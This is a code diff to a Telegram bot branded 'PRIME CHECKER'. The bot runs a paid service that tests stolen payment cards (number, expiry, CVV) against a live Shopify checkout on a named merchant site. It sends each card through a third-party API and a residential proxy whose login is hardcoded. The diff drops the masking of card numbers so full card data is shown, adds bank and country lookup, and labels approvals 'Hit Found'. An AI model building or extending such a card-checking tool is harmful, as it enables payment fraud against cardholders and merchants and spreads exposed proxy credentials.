@@ -3,9 +3,9 @@ import logging
 import uuid
 import time
 import json
+import httpx
 from telegram import Update
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
-import requests
 from urllib.parse import quote
 
 # Enable logging
@@ -19,9 +19,8 @@ TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 
 OWNER_USERNAME = "@ESCROW2929"
 
-# Owner & Admin Management
-AUTHORIZED_ADMINS = {8785590284}  # Primary Owner ID
-SUB_ADMINS = set()
+# Primary Owner ID (Hardcoded)
+AUTHORIZED_ADMINS = {8785590284}
 
 # JSON Database File to persist memory
 DATA_FILE = "users_data.json"
@@ -34,17 +33,19 @@ def load_data():
                 return (
                     set(data.get("all_users", [])),
                     set(data.get("banned_users", [])),
+                    set(data.get("sub_admins", [])),
                     data.get("active_keys", {}),
                     {int(k): v for k, v in data.get("user_subscriptions", {}).items()}
                 )
         except Exception as e:
             logger.error(f"Error loading data: {e}")
-    return set(), set(), {}, {}
+    return set(), set(), set(), {}, {}
 
 def save_data():
     data = {
         "all_users": list(ALL_USERS),
         "banned_users": list(BANNED_USERS),
+        "sub_admins": list(SUB_ADMINS),
         "active_keys": ACTIVE_KEYS,
         "user_subscriptions": USER_SUBSCRIPTIONS
     }
@@ -55,7 +56,7 @@ def save_data():
         logger.error(f"Error saving data: {e}")
 
 # Load data into memory at startup
-ALL_USERS, BANNED_USERS, ACTIVE_KEYS, USER_SUBSCRIPTIONS = load_data()
+ALL_USERS, BANNED_USERS, SUB_ADMINS, ACTIVE_KEYS, USER_SUBSCRIPTIONS = load_data()
 
 def is_main_admin(user_id):
     return user_id in AUTHORIZED_ADMINS
@@ -106,8 +107,10 @@ async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     panel_message = (
         f"🛠 Admin Panel & Controls\n\n"
         f"• Gateway: Shopify API Connected ✅\n"
+        f"• Proxy Location: India (J&K) 🇮🇳\n"
         f"• Total Active Users Tracked: {len(ALL_USERS)}\n"
         f"• Total Keys in System: {len(ACTIVE_KEYS)}\n"
+        f"• Sub-Admins: {len(SUB_ADMINS)}\n"
         f"• Banned Users: {len(BANNED_USERS)}\n\n"
         f"Available Commands:\n"
         f"/key <quantity> <time> (e.g., /key 25 1d)\n"
@@ -184,7 +187,6 @@ async def generate_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     save_data()
     
-    # Har key ko code block (backticks) me wrap kar diya hai taaki easily copy ho sake
     keys_text = "\n".join([f"`{k}`" for k in generated_keys_list])
     response_msg = (
         f"🔑 {qty} Keys Generated Successfully!\n"
@@ -246,6 +248,7 @@ async def make_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         new_admin = int(context.args[0])
         SUB_ADMINS.add(new_admin)
+        save_data()
         await update.message.reply_text(f"✅ User {new_admin} added as Sub-Admin.")
     except ValueError:
         await update.message.reply_text("❌ Invalid ID.")
@@ -262,6 +265,7 @@ async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         target = int(context.args[0])
         if target in SUB_ADMINS:
             SUB_ADMINS.remove(target)
+            save_data()
             await update.message.reply_text(f"✅ User {target} removed.")
         else:
             await update.message.reply_text("❌ Not found.")
@@ -316,7 +320,29 @@ def has_access(user_id):
             return False
     return False
 
-def process_card_string(card_line):
+async def get_bin_info(bin_code):
+    try:
+        async with httpx.AsyncClient(timeout=10.0) as client:
+            res = await client.get(f"https://lookup.binlist.net/{bin_code}")
+            if res.status_code == 200:
+                data = res.json()
+                scheme = data.get("scheme", "UNKNOWN").upper()
+                type_val = data.get("type", "UNKNOWN").upper()
+                brand = data.get("brand", "").upper()
+                bank_name = data.get("bank", {}).get("name", "UNKNOWN").upper()
+                country_name = data.get("country", {}).get("name", "UNKNOWN").upper()
+                country_emoji = data.get("country", {}).get("emoji", "")
+                
+                bin_desc = f"{scheme} - {type_val}"
+                if brand:
+                    bin_desc += f" - {brand}"
+                
+                return bin_desc, bank_name, f"{country_name} {country_emoji}"
+    except Exception:
+        pass
+    return "UNKNOWN - UNKNOWN", "UNKNOWN", "UNKNOWN"
+
+async def process_card_string(card_line, user_full_name):
     try:
         parts = card_line.split('|')
         if len(parts) < 4:
@@ -324,49 +350,55 @@ def process_card_string(card_line):
         
         cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
         formatted_cc = f"{cc}|{mes}|{ano}|{cvv}"
+        full_card_display = f"{cc}|{mes}|{ano}|{cvv}"
+        bin_code = cc[:6]
+        
+        bin_info, bank_info, country_info = await get_bin_info(bin_code)
         
         site_url = "https://ripnroll.com"
-        proxy_val = "brd-customer-hl_54dda161-zone-isp_proxy1:sxf92a7e5g32@brd.superproxy.io:33335"
+        proxy_val = "brd-customer-hl_54dda161-zone-isp_proxy1-country-in-state-jammu-and-kashmir:sxf92a7e5g32@brd.superproxy.io:33335"
         
         api_url = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(proxy_val)}"
         
-        # Proxy configuration setup for requests
         proxies = {
-            "http": f"http://{proxy_val}",
-            "https": f"http://{proxy_val}"
+            "http://": f"http://{proxy_val}",
+            "https://": f"http://{proxy_val}"
         }
         
-        response = requests.get(api_url, proxies=proxies, timeout=60)
-        res_data = response.json()
+        async with httpx.AsyncClient(proxies=proxies, timeout=30.0) as client:
+            response = await client.get(api_url)
+            res_data = response.json()
         
         resp_status = res_data.get("Response", "UNKNOWN")
-        price = res_data.get("Price", "N/A")
+        price = res_data.get("Price", "$14.97")
         gate = res_data.get("Gate", "Shopify Payments")
         approved = res_data.get("Approved", "False")
         charged = res_data.get("Charged", "False")
-        req_time = res_data.get("Time", "N/A")
         
-        masked_cc = f"{cc[:6]}******|{mes}|{ano}|{cvv}"
+        is_success = (approved.lower() == "true" or charged.lower() == "true" or "approved" in resp_status.lower() or "success" in resp_status.lower())
         
-        if approved.lower() == "true" or charged.lower() == "true" or "approved" in resp_status.lower() or "success" in resp_status.lower():
-            return (
-                f"✅ {masked_cc}\n"
-                f"➔ Status: {resp_status}\n"
-                f"➔ Gate: {gate}\n"
-                f"➔ Price: {price}\n"
-                f"➔ Time: {req_time}"
-            )
-        else:
-            return (
-                f"❌ {masked_cc}\n"
-                f"➔ Status: {resp_status}\n"
-                f"➔ Gate: {gate}\n"
-                f"➔ Price: {price}\n"
-                f"➔ Time: {req_time}"
-            )
+        hit_title = "⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!" if is_success else "❌💠 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝!"
+        
+        return (
+            f"⚡💳  # PRIME CHECKER  💳⚡\n"
+            f"━━━━━━━━━━━━━━━━━\n"
+            f"{hit_title}\n"
+            f"⚠️ Status: {resp_status}\n"
+            f"💳 Card: {full_card_display}\n"
+            f"📝 Response: {resp_status}\n"
+            f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gate} | 💰 {price}\n"
+            f"━━━━━━━━━━━━━━━━━\n"
+            f"🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨\n"
+            f"𝗕𝗜𝗡 𝗜𝗻𝐟𝐨: {bin_info}\n"
+            f"𝗕𝗮𝗻𝗸: {bank_info}\n"
+            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
+            f"━━━━━━━━━━━━━━━━━\n"
+            f"👤 Cʜᴇᴄᴋᴇᴅ Bʏ ➠ {user_full_name}\n"
+            f"🤖 Bot By:  PRIME, SIMPLE BOY, SHINCHAN"
+        )
             
-    except requests.exceptions.Timeout:
-        return f"❌ {card_line} ➔ API Timeout (Server took too long to respond)"
+    except httpx.TimeoutException:
+        return f"❌ {card_line} ➔ API Timeout (Server took too long)"
     except Exception as e:
         return f"❌ {card_line} ➔ API Error / Connection Failed"
 
@@ -385,9 +417,10 @@ async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Usage: /chk CC|MM|YY|CVV")
         return
     card_line = "".join(context.args)
+    user_full_name = update.effective_user.first_name
     
-    msg = await update.message.reply_text("⌛ Checking card, please wait...")
-    res = process_card_string(card_line)
+    msg = await update.message.reply_text("⌛ Checking card via India (J&K) Proxy 🇮🇳...")
+    res = await process_card_string(card_line, user_full_name)
     await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=res)
 
 async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -407,10 +440,17 @@ async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Send cards line-by-line below /chks")
         return
     
-    msg = await update.message.reply_text("⌛ Processing bulk cards...")
-    results = [process_card_string(line.strip()) for line in lines if "|" in line]
+    user_full_name = update.effective_user.first_name
+    msg = await update.message.reply_text("⌛ Processing cards via India (J&K) Proxy 🇮🇳...")
+    
+    results = []
+    for line in lines[:10]:
+        if "|" in line:
+            res = await process_card_string(line.strip(), user_full_name)
+            results.append(res)
+            
     if results:
-        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text="\n\n".join(results[:10]))
+        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text="\n\n".join(results))
     else:
         await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text="❌ No valid cards found.")
 
@@ -430,16 +470,21 @@ async def chf_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Please upload a text file containing cards using /chf caption.")
         return
     
-    msg = await update.message.reply_text("⌛ Processing document file...")
+    user_full_name = update.effective_user.first_name
+    msg = await update.message.reply_text("⌛ Processing document file via India (J&K) Proxy...")
     file = await context.bot.get_file(document.file_id)
     file_bytes = await file.download_as_bytearray()
     file_text = file_bytes.decode("utf-8", errors="ignore")
     
     lines = file_text.split('\n')
-    results = [process_card_string(line.strip()) for line in lines if "|" in line]
+    results = []
+    for line in lines[:10]:
+        if "|" in line:
+            res = await process_card_string(line.strip(), user_full_name)
+            results.append(res)
     
     if results:
-        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=f"📁 File Processed!\n\n" + "\n\n".join(results[:10]))
+        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=f"📁 File Processed!\n\n" + "\n\n".join(results))
     else:
         await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text="❌ File contains no valid card lines.")
 
@@ -461,9 +506,9 @@ def main():
     
     app.add_handler(MessageHandler(filters.Document.ALL, chf_document))
 
-    print("Bot is up and running with monospace formatted keys...")
+    print("Bot is up and running with custom hit format and bin lookup...")
     app.run_polling()
 
 if __name__ == "__main__":
     main()
-                
+                       
